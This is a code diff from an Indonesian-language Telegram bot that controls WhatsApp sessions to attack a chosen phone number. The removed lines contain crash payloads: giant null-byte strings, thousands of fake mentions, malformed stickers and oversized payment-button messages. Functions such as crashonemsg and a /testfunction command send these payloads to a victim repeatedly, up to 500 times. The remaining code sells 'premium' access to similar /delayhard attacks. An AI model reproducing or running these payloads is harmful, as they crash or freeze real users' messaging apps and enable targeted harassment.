-                    }
-                }
-            }
-        }
-    };
-
-    const ahkMsg = generateWAMessageFromContent(target, ahk, {});
-
-    await sock.relayMessage("status@broadcast", ahkMsg.message, {
-        statusJidList: [target],
-        messageId: ahkMsg.key.id,
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: undefined
-                }]
-            }]
-        }]
-    });
-
-    const stickers = {
-        stickerMessage: {
-            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
-            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
-            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
-            mediaKey: Buffer.alloc(32, '').toString('base64'),
-            mimetype: "image/webp",
-            height: -1,
-            width: 5000,
-            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
-            fileLength: null,
-            mediaKeyTimestamp: 1710000000,
-            firstFrameLength: 999,
-            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
-            isAnimated: true,
-            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
-            contextInfo: {
-                mentionedJid: [
-                    "0@s.whatsapp.net",
-                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
-                ],
-                interactiveAnnotations: [{
-                    polygonVertices: [
-                        { x: 0.1, y: 0.1 },
-                        { x: 0.9, y: 0.1 },
-                        { x: 0.9, y: 0.9 },
-                        { x: 0.1, y: 0.9 }
-                    ],
-                    location: {
-                        latitude: -6.2088,
-                        longitude: 106.8456,
-                        name: `Skylinne - Executed`,
-                    }
-                }]
-            },
-            stickerSentTs: 1710000000,
-            isAvatar: true,
-            isAiSticker: true,
-            isLottie: true,
-            accessibilityLabel: "\u0000".repeat(9000),
-            mediaKeyDomain: null
-        }
-    };
-
-    const msg = {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            caption: "Skylinne - Executed",
-                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
-                            fileLength: "109951162777600",
-                            height: -9999,
-                            width: 9999,
-                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
-                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
-                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
-                            mediaKeyTimestamp: "1774107894",
-                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
-                            viewOnce: true,
-                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
-                            scanLengths: [6677, 48757, 32501, 42353],
-                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
-                        },
-                        hasMediaAttachment: null
-                    },
-                    body: {
-                        text: "\u0000".repeat(1000)
-                    },
-                    contextInfo: {
-                        remoteJid: "status@broadcast",
-                        participant: target,
-                        isBuldo: true,
-                        mentionedJid: [
-                            "0@s.whatsapp.net",
-                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
-                        ],
-                        groupMentions: [],
-                        entryPointConversionSource: "non_contact",
-                        entryPointConversionApp: "whatsapp",
-                        entryPointConversionDelaySeconds: 467593,
-                        quotedMessage: {
-                            documentMessage: {
-                                url: "https://example.com/file.zip",
-                                mimetype: "application/zip",
-                                caption: "Skylinne - Executed",
-                                fileName: "GhostCrasher - Executed",
-                                fileLength: 99999,
-                                vCards: true
-                            }
-                        }
-                    },
-                    nativeFlowMessage: {
-                        messageParamsJson: "ြ".repeat(9000)
-                    }
-                }
-            }
-        }
-    };
-
-    const Nanas = generateWAMessageFromContent(target, stickers, {});
-    const Muda = generateWAMessageFromContent(target, msg, {});
-
-    await sock.relayMessage("status@broadcast", Nanas.message, {
-        messageId: null,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
-            }]
-        }]
-    });
-
-    await sock.relayMessage("status@broadcast", Muda.message, {
-        messageId: null,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
-            }]
-        }]
-    });
-
-    const startTime = Date.now();
-    const duration = 5 * 60 * 1500;
-
-    while (Date.now() - startTime < duration) {
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: {
-                    extendedTextMessage: {
-                        text: "\u0000".repeat(75000),
-                        contextInfo: {
-                            participant: target,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
-                            ]
-                        }
-                    }
-                }
-            }
-        }, { participant: target });
-    }
-
-    await sock.relayMessage(target, {
-        groupStatusMessageV2: {
-            nativeFlowMessage: {
-                extendedTextMessage: {
-                    text: "\u0003".repeat(9000),
-                    contextInfo: {
-                        participant: target,
-                        mentionedJid: [
-                            "0@s.whatsapp.net",
-                            ...Array.from(
-                                { length: 1999 },
-                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
-                            )
-                        ]
-                    }
-                }
-            }
-        }
-    }, { participant: target });
-},
-
-  test2: async (sock, target) => {
-    console.log("TEST 2:", target);
-
-    // Aksi test kedua
-  }
-};
-
-// ===============================
-// PARSE DELAY
-// ===============================
-
-// Format:
-// 500ms = 500 milidetik
-// 5d    = 5 detik
-// 2m    = 2 menit
-// 1j    = 1 jam
-
-function parseDelay(value) {
-  const match = String(value)
-    .trim()
-    .match(/^(\d+(?:\.\d+)?)(ms|d|m|j)$/i);
-
-  if (!match) {
-    return null;
-  }
-
-  const amount = Number(match[1]);
-  const unit = match[2].toLowerCase();
-
-  const multipliers = {
-    ms: 1,
-    d: 1000,
-    m: 60 * 1000,
-    j: 60 * 60 * 1000
-  };
-
-  return amount * multipliers[unit];
-}
-
-
-// ===============================
-// FORMAT DELAY UNTUK TAMPILAN
-// ===============================
-
-function formatDelay(ms) {
-  if (ms >= 60 * 60 * 1000 && ms % (60 * 60 * 1000) === 0) {
-    return `${ms / (60 * 60 * 1000)}j`;
-  }
-
-  if (ms >= 60 * 1000 && ms % (60 * 1000) === 0) {
-    return `${ms / (60 * 1000)}m`;
-  }
-
-  if (ms >= 1000 && ms % 1000 === 0) {
-    return `${ms / 1000}d`;
-  }
-
-  return `${ms}ms`;
-}
-
-
-// ===============================
-// COMMAND /TESTFUNCTION
-// ===============================
-
-bot.onText(
-  /^\/testfunction\s+(\d+)\s+(\d+)\s+([A-Za-z0-9_$]+)\s+(\d+)\s+(\d+(?:\.\d+)?(?:ms|d|m|j))$/i,
-  async (msg, match) => {
-
-    const chatId = msg.chat.id;
-
-    try {
-
-      // ===============================
-      // AMBIL ARGUMEN
-      // ===============================
-
-      const botNumber =
-        match[1].replace(/[^0-9]/g, "");
-
-      const targetNumber =
-        match[2].replace(/[^0-9]/g, "");
-
-      const functionName =
-        match[3];
-
-      const jumlah =
-        parseInt(match[4], 10);
-
-      const delayInput =
-        match[5];
-
-      // ===============================
-      // VALIDASI JUMLAH
-      // ===============================
-
-      if (!Number.isInteger(jumlah) || jumlah < 1 || jumlah > 500) {
-
-        return bot.sendMessage(
-          chatId,
-          "❌ ☇ Jumlah harus antara 1-500."
-        );
-      }
-
-      // ===============================
-      // PARSE DELAY
-      // ===============================
-
-      const delay =
-        parseDelay(delayInput);
-
-      if (delay === null) {
-
-        return bot.sendMessage(
-          chatId,
-          [
-            "❌ ☇ Delay tidak valid.",
-            "",
-            "Contoh:",
-            "• 500ms",
-            "• 5d",
-            "• 2m",
-            "• 1j"
-          ].join("\n")
-        );
-      }
-
-      // ===============================
-      // BATAS DELAY
-      // ===============================
-
-      // Maksimal 24 jam per jeda
-      const maxDelay =
-        24 * 60 * 60 * 1000;
-
-      if (delay > maxDelay) {
-
-        return bot.sendMessage(
-          chatId,
-          "❌ ☇ Delay maksimal 24 jam."
-        );
-      }
-
-      // ===============================
-      // AMBIL SESSION
-      // ===============================
-
-      const sessionSock =
-        sessions.get(botNumber);
-
-      if (!sessionSock) {
-
-        return bot.sendMessage(
-          chatId,
-          [
-            `❌ ☇ Session ${botNumber} tidak ditemukan.`,
-            "",
-            `Gunakan:`,
-            `/addbot ${botNumber}`
-          ].join("\n")
-        );
-      }
-
-      // ===============================
-      // VALIDASI FUNCTION
-      // ===============================
-
-      const fn =
-        testFunctions[functionName];
-
-      if (typeof fn !== "function") {
-
-        const availableFunctions =
-          Object.keys(testFunctions);
-
-        return bot.sendMessage(
-          chatId,
-          [
-            `❌ ☇ Function "${functionName}" tidak tersedia.`,
-            "",
-            "Function tersedia:",
-            ...availableFunctions.map(
-              name => `• ${name}`
-            )
-          ].join("\n")
-        );
-      }
-
-      // ===============================
-      // TARGET
-      // ===============================
-
-      const target =
-        targetNumber + "@s.whatsapp.net";
-
-      // ===============================
-      // PROCESS MESSAGE
-      // ===============================
-
-      const processMsg =
-        await bot.sendMessage(
-          chatId,
-
-`<blockquote><pre>⬡═―—⊱ ⎧ Voltra Nexus ⎭ ⊰―—═⬡
-⌑ Session: ${botNumber}
-⌑ Target: ${targetNumber}
-⌑ Function: ${functionName}
-⌑ Jumlah: ${jumlah}
-⌑ Delay: ${formatDelay(delay)}
-⌑ Progress: 0/${jumlah}
-⌑ Success: 0
-⌑ Failed: 0
-⌑ Status: Process
-╘═——————————————═⬡</pre></blockquote>`,
-
-          {
-            parse_mode: "HTML"
-          }
-        );
-
-      // ===============================
-      // COUNTER
-      // ===============================
-
-      let success = 0;
-      let failed = 0;
-
-      // ===============================
-      // LOOP
-      // ===============================
-
-      for (let i = 0; i < jumlah; i++) {
-
-        try {
-
-          await fn(
-            sessionSock,
-            target
-          );
-
-          success++;
-
-        } catch (err) {
-
-          failed++;
-
-          console.error(
-            `testfunction #${i + 1}:`,
-            err
-          );
-        }
-
-        // ===============================
-        // UPDATE PROGRESS
-        // ===============================
-
-        const progress =
-          i + 1;
-
-        // Update Telegram setiap eksekusi.
-        // Bisa diubah supaya hanya update tiap 5/10 kali
-        // kalau jumlah besar.
-
-        try {
-
-          await bot.editMessageText(
-
-`<blockquote><pre>⬡═―—⊱ ⎧ Voltra Nexus ⎭ ⊰―—═⬡
-⌑ Session: ${botNumber}
-⌑ Target: ${targetNumber}
-⌑ Function: ${functionName}
-⌑ Jumlah: ${jumlah}
-⌑ Delay: ${formatDelay(delay)}
-⌑ Progress: ${progress}/${jumlah}
-⌑ Success: ${success}
-⌑ Failed: ${failed}
-⌑ Status: ${progress >= jumlah ? "Finishing" : "Process"}
-╘═——————————————═⬡</pre></blockquote>`,
-
-            {
-              chat_id: chatId,
-              message_id: processMsg.message_id,
-              parse_mode: "HTML"
-            }
-          );
-
-        } catch (editErr) {
-
-          console.error(
-            "Gagal update progress:",
-            editErr
-          );
-        }
-
-        // ===============================
-        // DELAY
-        // ===============================
-
-        if (i < jumlah - 1) {
-
-          await sleep(delay);
-
-        }
-      }
-
-      // ===============================
-      // FINAL RESULT
-      // ===============================
-
-      const finalText =
-`<blockquote><pre>⬡═―—⊱ ⎧ Voltra Nexus ⎭ ⊰―—═⬡
-⌑ Session: ${botNumber}
-⌑ Target: ${targetNumber}
-⌑ Function: ${functionName}
-⌑ Jumlah: ${jumlah}
-⌑ Delay: ${formatDelay(delay)}
-⌑ Success: ${success}
-⌑ Failed: ${failed}
-⌑ Status: Success
-╘═——————————————═⬡</pre></blockquote>`;
-
-      try {
-
-        await bot.editMessageText(
-          finalText,
-          {
-            chat_id: chatId,
-            message_id: processMsg.message_id,
-            parse_mode: "HTML"
-          }
-        );
-
-      } catch (editErr) {
-
-        console.error(
-          "Gagal update hasil akhir:",
-          editErr
-        );
-
-        await bot.sendMessage(
-          chatId,
-          finalText,
-          {
-            parse_mode: "HTML"
-          }
-        );
-      }
-
-    } catch (err) {
-
-      console.error(
-        "testfunction error:",
-        err
-      );
-
-      await bot.sendMessage(
-        chatId,
-        `❌ ☇ Error: ${err?.message || String(err)}`
-      );
-    }
-  }
-);
-
 bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
@@ -2170,8 +1514,17 @@ bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
-    buy akses ke owner di bawa inii !!!`,
+    caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
@@ -2260,103 +1613,6 @@ if (remainingTime > 0) {
 });
 
 // /TEMPAT FUNC DISINI ///
-async function crashonemsg(sock, target) {
-  const payload = {
-    interactiveMessage: {
-      header: {
-        title: "\x10\x00".repeat(100000),
-        subtitle: "\x10\x00".repeat(100000),
-        hasMediaAttachment: false
-      },
-      body: {
-        text: "\x10\x00".repeat(100000)
-      },
-      footer: {
-        text: "\x10\x00".repeat(100000)
-      },
-      nativeFlowMessage: {
-        messageVersion: 1,
-        buttons: Array(20).fill({
-          name: "review_and_pay",
-          buttonParamsJson: JSON.stringify({
-            reference_id: "{".repeat(100000),
-            type: "physical-goods",
-            payment_settings: [
-              {
-                type: "offline",
-                additional_note: "\x10\x00".repeat(100000),
-                currency: "IDR",
-                total_amount: { value: 99999, offset: 0 }
-              }
-            ]
-          })
-        })
-      }
-    }
-  };
-
-  for (let i = 0; i < 76; i++) {
-    try {
-      await sock.relayMessage(target, payload, { noSelfSync: true });
-    } catch (e) {}
-  }
-}
-
-async function wowoceombg(sock, target) {
-  const msg = {
-    interactiveMessage: {
-      header: {
-        title: "\x10\x00".repeat(1000000),
-        subtitle: "\x10\x00".repeat(1000000),
-        hasMediaAttachment: false
-      },
-      body: {
-        text: "\x10\x00".repeat(1000000)
-      },
-      footer: {
-        text: "\x10\x00".repeat(1000000)
-      },
-      nativeFlowMessage: {
-        buttons: [
-          {
-            name: "review_and_pay",
-            buttonParamsJson: JSON.stringify({
-              reference_id: "{".repeat(2000000),
-              type: "physical-goods",
-              payment_settings: [],
-              additional_note: "A".repeat(2000000),
-              currency: "IDR",
-              total_amount: { value: 999999999, offset: 0 }
-            })
-          },
-          {
-            name: "review_and_pay",
-            buttonParamsJson: JSON.stringify({
-              reference_id: "{".repeat(2000000),
-              type: "physical-goods",
-              payment_settings: []
-            })
-          },
-          {
-            name: "review_and_pay",
-            buttonParamsJson: JSON.stringify({
-              reference_id: "{".repeat(2000000),
-              type: "physical-goods",
-              payment_settings: []
-            })
-          }
-        ]
-      }
-    }
-  };
-
-  for (let i = 0; i < 50; i++) {
-    try {
-      await sock.relayMessage(target, msg, { noSelfSync: true });
-    } catch (e) {}
-  }
-}
-
 async function delayhardinvisible(sock, target) {
     const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -2721,59 +1977,6 @@ bot.onText(/^\/xnxx(?: (.+))?$/, async (msg, match) => {
   } catch (e) {
     console.error(e);
     bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
-  }
-});
-
-bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const fromId = msg.from.id;
-
-  // hanya bisa di grup
-  if (msg.chat.type === "private") {
-    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
-  }
-
-  // harus reply atau sebut username
-  const repliedUser = msg.reply_to_message?.from;
-  const username = match[1];
-  let targetUser;
-
-  if (repliedUser) {
-    targetUser = repliedUser;
-  } else if (username) {
-    // ambil member dari username
-    try {
-      const members = await bot.getChatAdministrators(chatId);
-      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
-    } catch (e) {
-      console.error("Gagal ambil member:", e.message);
-    }
-  }
-
-  if (!targetUser) {
-    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
-  }
-
-  try {
-    await bot.restrictChatMember(chatId, targetUser.id, {
-      permissions: {
-        can_send_messages: true,
-        can_send_media_messages: true,
-        can_send_polls: true,
-        can_send_other_messages: true,
-        can_add_web_page_previews: true,
-        can_change_info: false,
-        can_invite_users: true,
-        can_pin_messages: false
-      }
-    });
-
-    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
-      parse_mode: "Markdown"
-    });
-  } catch (err) {
-    console.error("Error unmute:", err.message);
-    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
   }
 });
 
